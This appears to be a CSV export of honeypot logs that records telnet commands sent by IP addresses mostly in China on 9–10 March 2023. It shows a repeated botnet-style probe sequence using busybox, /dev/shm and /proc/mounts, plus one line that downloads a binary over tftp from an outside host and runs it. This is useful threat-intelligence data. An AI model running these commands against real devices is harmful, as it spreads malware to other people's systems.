@timestamp,input.keyword,src_ip,geoip.city_name,geoip.country_name
"Mar 10, 2023 @ 08:40:58.208",while read i,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:58.204",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.977",tftp; wget; /bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.747",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.501",cat /proc/mounts; /bin/busybox LFOHI,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.268",sh,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.267",shell,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.267",shell,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.266",system,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.265",system,49.70.13.51,-,China
"Mar 10, 2023 @ 08:40:57.263",enable,49.70.13.51,-,China
"Mar 10, 2023 @ 08:04:44.552",rm .s; exit,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:44.515",/bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:44.270",while read i,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:44.263",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.998",tftp; wget; /bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.706",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.414",cat /proc/mounts; /bin/busybox TJKDS,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.158",sh,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.157",shell,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.157",shell,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.156",system,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.155",system,223.8.205.227,-,China
"Mar 10, 2023 @ 08:04:43.153",enable,223.8.205.227,-,China
"Mar 10, 2023 @ 07:30:10.697",rm .s; exit,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.695",/bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.453",while read i,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.450",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:10.203",tftp; wget; /bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:09.960",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:09.195",cat /proc/mounts; /bin/busybox FVJIZ,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.951",sh,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.950",shell,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.949",shell,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.948",system,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.948",system,222.246.108.141,Changde,China
"Mar 10, 2023 @ 07:30:08.945",enable,222.246.108.141,Changde,China
"Mar 10, 2023 @ 06:04:20.322",rm .s; exit,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:20.145",/bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.883",while read i,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.880",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.564",tftp; wget; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:19.297",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.710",cat /proc/mounts; /bin/busybox NWMXZ,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.411",sh,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.410",shell,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.410",shell,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.409",system,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.400",system,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 06:04:18.398",enable,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 05:20:14.090",rm .s; exit,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:14.087",/bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.831",while read i,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.828",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.555",tftp; wget; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.297",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:13.016",cat /proc/mounts; /bin/busybox NHEMZ,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.755",sh,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.753",shell,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.752",shell,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.751",system,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.750",system,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:20:12.749",enable,113.25.130.24,Zhongshan,China
"Mar 10, 2023 @ 05:06:54.153",rm .s; exit,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:54.139",/bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.858",while read i,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.842",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.566",tftp; wget; /bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:53.270",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.974",cat /proc/mounts; /bin/busybox MZUEG,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.680",sh,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.679",shell,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.678",system,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.678",shell,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.677",system,110.182.124.16,-,China
"Mar 10, 2023 @ 05:06:52.658",enable,110.182.124.16,-,China
"Mar 10, 2023 @ 04:53:50.646",rm .s; exit,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.630",/bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.362",while read i,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.359",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:50.073",tftp; wget; /bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.792",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.504",cat /proc/mounts; /bin/busybox OZPCS,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.217",sh,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.216",shell,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.215",shell,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.213",system,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.213",system,106.41.74.164,-,China
"Mar 10, 2023 @ 04:53:49.211",enable,106.41.74.164,-,China
"Mar 10, 2023 @ 04:39:18.159",rm .s; exit,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:18.156",/bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.902",while read i,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.898",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.640",tftp; wget; /bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.370",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:17.098",cat /proc/mounts; /bin/busybox UTOYA,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.841",sh,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.840",shell,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.839",shell,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.836",system,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.836",system,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 04:39:16.834",enable,123.185.223.115,Dalian,China
"Mar 10, 2023 @ 03:32:58.415",rm .s; exit,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:58.411",/bin/busybox JJSHB,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:58.218",while read i,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:58.212",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:58.018",tftp; wget; /bin/busybox JJSHB,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.822",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JJSHB,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.623",cat /proc/mounts; /bin/busybox JJSHB,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.430",sh,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.429",shell,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.428",shell,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.427",system,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.426",system,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:32:57.425",enable,85.185.210.231,-,Iran
"Mar 10, 2023 @ 03:04:20.572",rm .s; exit,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:20.570",/bin/busybox GPZQV,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:20.304",while read i,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:20.299",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:20.026",tftp; wget; /bin/busybox GPZQV,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.747",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GPZQV,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.454",cat /proc/mounts; /bin/busybox GPZQV,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.182",sh,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.181",shell,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.180",shell,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.179",system,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.176",system,223.13.64.108,-,China
"Mar 10, 2023 @ 03:04:19.174",enable,223.13.64.108,-,China
"Mar 10, 2023 @ 02:50:24.847",rm .s; exit,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:24.843",/bin/busybox RDNEL,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:24.613",while read i,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:24.610",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:24.361",tftp; wget; /bin/busybox RDNEL,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:24.127",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RDNEL,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.868",cat /proc/mounts; /bin/busybox RDNEL,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.636",sh,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.635",shell,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.632",system,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.632",shell,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.631",system,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:50:23.629",enable,114.216.177.136,Shanghai,China
"Mar 10, 2023 @ 02:07:23.400",rm .s; exit,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:23.392",/bin/busybox FKWDL,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:23.178",while read i,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:23.175",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.957",tftp; wget; /bin/busybox FKWDL,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.725",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FKWDL,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.500",cat /proc/mounts; /bin/busybox FKWDL,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.264",sh,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.263",shell,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.263",shell,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.262",system,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.261",system,49.89.185.43,-,China
"Mar 10, 2023 @ 02:07:22.259",enable,49.89.185.43,-,China
"Mar 10, 2023 @ 01:55:48.887",rm .s; exit,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:48.882",/bin/busybox IWEQD,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:48.623",while read i,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:48.619",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:48.353",tftp; wget; /bin/busybox IWEQD,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:48.080",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IWEQD,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.278",cat /proc/mounts; /bin/busybox IWEQD,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.007",sh,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.007",shell,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.006",shell,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.005",system,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.004",system,223.15.53.196,-,China
"Mar 10, 2023 @ 01:55:47.003",enable,223.15.53.196,-,China
"Mar 10, 2023 @ 01:04:12.510",rm .s; exit,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.508",/bin/busybox JELPE,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.439",while read i,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.436",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.365",tftp; wget; /bin/busybox JELPE,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.295",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JELPE,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.220",cat /proc/mounts; /bin/busybox JELPE,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.150",shell,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.150",sh,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.149",shell,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.148",system,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.147",system,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 01:04:12.145",enable,187.213.35.180,Altamira,Mexico
"Mar 10, 2023 @ 00:39:51.817",rm .s; tftp -l.i -r.i -g 168.181.123.73:47235; chmod 777 .i; ./.i; exit,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:51.579",/bin/busybox NBNXG,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:51.343",while read i,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:51.340",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:51.098",tftp; wget; /bin/busybox NBNXG,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.859",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NBNXG,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.608",cat /proc/mounts; /bin/busybox NBNXG,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.367",sh,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.366",shell,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.365",shell,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.365",system,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.364",system,223.10.10.115,-,China
"Mar 10, 2023 @ 00:39:50.362",enable,223.10.10.115,-,China
"Mar 10, 2023 @ 00:34:32.345",rm .s; exit,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:32.197",/bin/busybox RVRRT,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:31.576",while read i,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:31.573",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:31.052",tftp; wget; /bin/busybox RVRRT,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:30.727",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RVRRT,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:30.243",cat /proc/mounts; /bin/busybox RVRRT,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:29.920",sh,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:29.919",shell,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:29.918",shell,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:29.917",system,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:29.916",system,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:34:29.914",enable,36.48.64.189,Changchun,China
"Mar 10, 2023 @ 00:25:57.404",rm .s; exit,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:57.395",/bin/busybox UIVUL,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:57.196",while read i,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:57.192",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.989",tftp; wget; /bin/busybox UIVUL,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.779",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UIVUL,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.558",cat /proc/mounts; /bin/busybox UIVUL,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.338",sh,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.337",shell,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.336",shell,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.335",system,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.334",system,117.63.78.226,Suzhou,China
"Mar 10, 2023 @ 00:25:56.332",enable,117.63.78.226,Suzhou,China
"Mar 9, 2023 @ 23:58:50.672",rm .s; exit,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:50.664",/bin/busybox SLVDR,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:50.420",while read i,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:50.417",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:50.169",tftp; wget; /bin/busybox SLVDR,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.924",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SLVDR,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.682",cat /proc/mounts; /bin/busybox SLVDR,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.447",shell,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.447",sh,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.446",shell,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.445",system,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.444",system,106.111.38.59,-,China
"Mar 9, 2023 @ 23:58:49.442",enable,106.111.38.59,-,China
"Mar 9, 2023 @ 23:33:39.487",rm .s; exit,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:39.485",/bin/busybox YWIQR,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:39.250",while read i,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:39.247",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:39.003",tftp; wget; /bin/busybox YWIQR,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.765",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YWIQR,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.526",cat /proc/mounts; /bin/busybox YWIQR,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.289",sh,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.288",shell,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.287",shell,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.286",system,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.285",system,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:33:38.283",enable,113.246.132.247,Changsha,China
"Mar 9, 2023 @ 23:24:30.076",rm .s; exit,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:30.068",/bin/busybox HVWJW,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:29.815",while read i,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:29.812",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:29.537",tftp; wget; /bin/busybox HVWJW,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:29.281",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HVWJW,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:29.022",cat /proc/mounts; /bin/busybox HVWJW,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:28.768",sh,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:28.767",shell,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:28.766",shell,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:28.765",system,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:28.765",system,222.246.40.255,Changde,China
"Mar 9, 2023 @ 23:24:28.763",enable,222.246.40.255,Changde,China
"Mar 9, 2023 @ 22:55:22.249",cat /bin/echo;,109.206.243.207,-,Germany
"Mar 9, 2023 @ 22:52:50.010",rm .s; exit,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:50.007",/bin/busybox SGXBZ,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:49.740",while read i,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:49.737",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:49.469",tftp; wget; /bin/busybox SGXBZ,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:49.203",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SGXBZ,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.935",cat /proc/mounts; /bin/busybox SGXBZ,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.673",sh,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.672",shell,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.671",shell,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.670",system,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.669",system,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:52:48.667",enable,105.163.55.62,-,Kenya
"Mar 9, 2023 @ 22:38:16.303",rm .s; exit,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:16.294",/bin/busybox QDVGZ,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:16.075",while read i,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:16.072",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.849",tftp; wget; /bin/busybox QDVGZ,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.627",cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QDVGZ,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.403",cat /proc/mounts; /bin/busybox QDVGZ,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.180",sh,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.179",shell,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.178",system,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.178",shell,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.177",system,123.187.108.121,-,China
"Mar 9, 2023 @ 22:38:15.175",enable,123.187.108.121,-,China
"Mar 9, 2023 @ 22:34:29.704",rm .s; exit,49.74.5.12,Nanjing,China
"Mar 9, 2023 @ 22:34:29.702",/bin/busybox TENZC,49.74.5.12,Nanjing,China
"Mar 9, 2023 @ 22:34:29.461",while read i,49.74.5.12,Nanjing,China
"Mar 9, 2023 @ 22:34:29.457",dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,49.74.5.12,Nanjing,China
